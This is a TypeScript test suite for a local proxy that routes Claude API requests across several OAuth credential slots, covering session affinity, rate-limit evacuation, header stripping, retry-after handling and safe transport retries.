test('a Fable decision does not move the account holding the Opus prefix', async () => {
  const { AffinityStore } = await import('../src/affinity.js');
  const store = new AffinityStore({ stateRoot: tmp('cab-sec-st-') });

  store.touch('sess', '1', 'claude-opus-5');
  store.touch('sess', '2', 'claude-fable-5');

  assert.equal(store.lookup('sess', 'claude-opus-5'), '1', 'Opus lease is untouched');
  assert.equal(store.lookup('sess', 'claude-fable-5'), '2');
});

// --- evacuation horizon ---------------------------------------------------

test('a 5h window that refills before the cache expires does not trigger a paid move', () => {
  const now = 2_000_000_000_000;
  const account: AccountState = {
    slot: '1',
    health: 'ok',
    claims: parseClaims({
      'anthropic-ratelimit-unified-5h-utilization': '0.96',
      // resets in seven minutes
      'anthropic-ratelimit-unified-5h-reset': String(Math.floor((now + 7 * 60_000) / 1000)),
      'anthropic-ratelimit-unified-7d-utilization': '0.35',
    }),
  };
  const h = computeHeadroom(account, 'claude-opus-5', now);
  assert.equal(h.evacuating, false, 'the bucket refills long before the 1h cache does');

  const s = selectAccount({
    accounts: [account, { slot: '2', health: 'ok' }],
    model: 'claude-opus-5',
    affinitySlot: '1',
    nowMs: now,
  });
  assert.equal(s.decision, 'affinity-hold');
  assert.equal(s.slot, '1');
});

test('a Fable weekly window still beyond the cache horizon evacuates at 95%', () => {
  const now = 2_000_000_000_000;
  const account: AccountState = {
    slot: '1',
    health: 'ok',
    claims: parseClaims({
      'anthropic-ratelimit-unified-7d-utilization': '0.96',
      'anthropic-ratelimit-unified-7d-reset': String(Math.floor((now + 3 * 86_400_000) / 1000)),
    }),
  };
  assert.equal(computeHeadroom(account, 'claude-fable-5', now).evacuating, true);

  const s = selectAccount({
    accounts: [account, { slot: '2', health: 'ok' }],
    model: 'claude-fable-5',
    affinitySlot: '1',
    nowMs: now,
  });
  assert.equal(s.slot, '2');
  assert.equal(s.decision, 'affinity-broken');
});

test('a rejected claim does not fabricate a 100% utilization figure', () => {
  const now = 2_000_000_000_000;
  const account: AccountState = {
    slot: '1',
    health: 'ok',
    claims: parseClaims({
      'anthropic-ratelimit-unified-7d-status': 'rejected',
      'anthropic-ratelimit-unified-7d-reset': String(Math.floor((now + 86_400_000) / 1000)),
    }),
  };
  const h = computeHeadroom(account, 'claude-opus-5', now);
  assert.equal(h.headroom, 0, 'still unusable');
  assert.equal(h.peakUtilization, undefined, 'the server never sent a utilization number');
});

// --- credential hygiene ---------------------------------------------------

test('a stray x-api-key is not forwarded alongside the substituted bearer', async () => {
  const authswapRoot = fakeAuthswap('tok-1');
  let sawApiKey: string | undefined;
  let sawAuth: string | undefined;
  const upstreamPort = await listen(
    http.createServer((req, res) => {
      sawApiKey = req.headers['x-api-key'] as string | undefined;
      sawAuth = req.headers.authorization;
      req.resume();
      req.on('end', () => res.writeHead(200, {}).end('{}'));
    }),
  );
  const { server, port } = await startProxy({
    port: 0,
    upstream: `http://127.0.0.1:${upstreamPort}`,
    stateRoot: tmp('cab-sec-st-'),
    authswapRoot,
    metrics: false,
    usageProbe: false,
    requireGatewayAuth: false,
  });
  cleanups.push(() => server.close());

  await fetch(`http://127.0.0.1:${port}/v1/messages`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-api-key': 'local-nonce' },
    body: JSON.stringify({ model: 'claude-opus-5' }),
  });

  assert.equal(sawApiKey, undefined, 'the non-secret gateway selector must never leave localhost');
  assert.equal(sawAuth, 'Bearer tok-1');
});

// --- retry-after ----------------------------------------------------------

test('a short retry-after is waited out rather than paying a cache re-create', async () => {
  const root = tmp('cab-sec-as-');
  const dir = path.join(root, 'providers', 'anthropic', 'credentials');
  mkdirSync(dir, { recursive: true });
  for (const slot of ['1', '2']) {
    writeFileSync(
      path.join(dir, `.credentials-${slot}-s${slot}@x.com.json`),
      JSON.stringify({
        claudeAiOauth: { accessToken: `tok-${slot}`, expiresAt: Date.now() + 3_600_000 },
      }),
    );
  }

  const seen: string[] = [];
  let first = true;
  const upstreamPort = await listen(
    http.createServer((req, res) => {
      seen.push(req.headers.authorization ?? '');
      req.resume();
      req.on('end', () => {
        if (first) {
          first = false;
          res.writeHead(429, { 'retry-after': '1' }).end('{}');
        } else {
          res.writeHead(200, {}).end('{"ok":true}');
        }
      });
    }),
  );

  const { server, port } = await startProxy({
    port: 0,
    upstream: `http://127.0.0.1:${upstreamPort}`,
    stateRoot: tmp('cab-sec-st-'),
    authswapRoot: root,
    metrics: false,
    usageProbe: false,
    requireGatewayAuth: false,
  });
  cleanups.push(() => server.close());

  const res = await fetch(`http://127.0.0.1:${port}/v1/messages`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-claude-code-session-id': 'wait-session' },
    body: JSON.stringify({ model: 'claude-opus-5' }),
  });
  assert.equal(res.status, 200);
  assert.deepEqual(seen, ['Bearer tok-1', 'Bearer tok-1'], 'waited on the warm account');
});

test('a never-ending 429 control body is bounded and cannot hang rotation', async () => {
  const root = tmp('cab-sec-as-');
  const dir = path.join(root, 'providers', 'anthropic', 'credentials');
  mkdirSync(dir, { recursive: true });
  for (const slot of ['1', '2']) {
    writeFileSync(
      path.join(dir, `.credentials-${slot}-s${slot}@x.com.json`),
      JSON.stringify({
        claudeAiOauth: { accessToken: `tok-${slot}`, expiresAt: Date.now() + 3_600_000 },
      }),
    );
  }

  let first = true;
  const upstreamPort = await listen(
    http.createServer((req, res) => {
      req.resume();
      req.on('end', () => {
        if (first) {
          first = false;
          res.writeHead(429, {});
          res.write('{"type":"error"');
          return;
        }
        res.writeHead(200, {}).end('{"ok":true}');
      });
    }),
  );
  const stateRoot = tmp('cab-429-bound-');
  const { server, port } = await startProxy({
    port: 0,
    upstream: `http://127.0.0.1:${upstreamPort}`,
    stateRoot,
    authswapRoot: root,
    metrics: false,
    usageProbe: false,
    requireGatewayAuth: false,
  });
  cleanups.push(() => server.close());

  const started = Date.now();
  const res = await fetch(`http://127.0.0.1:${port}/v1/messages`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-claude-code-session-id': 'bounded-429' },
    body: JSON.stringify({ model: 'claude-opus-5' }),
  });
  assert.equal(res.status, 200);
  assert.ok(Date.now() - started < 3000, '429 body was abandoned at the bounded control deadline');

  const store = new AttemptStore(stateRoot);
  try {
    const rows = store.query(
      "SELECT outcome, evidence_codes_json FROM auth_balancer_attempts WHERE outcome = 'rate_limited_pre_content'",
    ) as Record<string, string>[];
    assert.equal(rows.length, 1);
    assert.match(rows[0]!['evidence_codes_json'], /control_body_deadline_reached/);
  } finally {
    store.close();
  }
});

test('retry-after parses both delta-seconds and an HTTP date', () => {
  const now = 1_700_000_000_000;
  assert.equal(retryAfterMs({ 'retry-after': '8' }, now), 8000);
  assert.equal(retryAfterMs({ 'retry-after': '0' }, now), 0);
  assert.equal(retryAfterMs({}, now), undefined);
  assert.equal(retryAfterMs({ 'retry-after': 'nonsense' }, now), undefined);
  assert.equal(retryAfterMs({ 'retry-after': new Date(now + 5000).toUTCString() }, now), 5000);
});

// --- transport retry eligibility ------------------------------------------

test('only a broken pre-wire connection, or a request upstream refused, is eligible for hidden retry', () => {
  assert.equal(isRetryableTransportError({ phase: 'pre-wire', code: 'ECONNRESET' }), true);
  assert.equal(isRetryableTransportError({ phase: 'pre-header', code: 'ECONNRESET' }), true);
  assert.equal(
    isRetryableTransportError({ phase: 'pre-header', code: 'ERR_SSL_SSL/TLS_ALERT_BAD_RECORD_MAC' }),
    true,
    'the failure this retry exists for',
  );
  assert.equal(
    isRetryableTransportError({ phase: 'pre-header', code: 'UPSTREAM_HEADERS_TIMEOUT' }),
    false,
    'the server may still be running that inference; re-sending would bill a second one',
  );
  assert.equal(
    isRetryableTransportError({ phase: 'pre-header', code: undefined }),
    false,
    'an unclassified failure is terminal, not retried on a guess',
  );
  assert.equal(
    isRetryableTransportError({ phase: 'after-wire', code: 'ERR_SSL_SSL/TLS_ALERT_BAD_RECORD_MAC' }),
    true,
    'upstream refused a request record, so it never held the whole request',
  );
  assert.equal(
    isRetryableTransportError({ phase: 'after-wire', code: 'ECONNRESET' }),
    false,
    'a reset after wire may follow a complete request',
  );
  assert.equal(
    isRetryableTransportError({ phase: 'after-wire', code: 'ERR_SSL_DECRYPTION_FAILED_OR_BAD_RECORD_MAC' }),
    false,
    'we refused an upstream record: upstream was already answering',
  );
  assert.equal(
    isRetryableTransportError({ phase: 'streaming', code: 'ECONNRESET' }),
    false,
    'bytes already reached the client; a re-send would duplicate them',
  );
});
